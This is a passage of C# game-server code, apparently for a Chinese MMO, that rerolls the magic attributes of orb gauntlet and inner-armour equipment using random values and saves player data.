						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手稀有ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠护手传说属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠护手传说属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠护手传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠内甲属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠内甲属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠内甲ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
